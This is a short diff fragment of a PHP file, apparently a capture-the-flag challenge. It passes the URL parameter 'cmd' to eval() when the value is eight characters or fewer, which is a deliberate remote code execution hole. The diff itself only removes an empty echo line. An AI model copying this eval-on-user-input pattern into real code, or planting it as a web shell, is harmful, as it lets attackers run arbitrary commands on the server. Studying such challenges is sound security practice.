@@ -1,5 +1,4 @@
 <?php
-echo "";
 if(strlen($_GET['cmd'])<=8){
 eval($_GET['cmd']);}
 else{
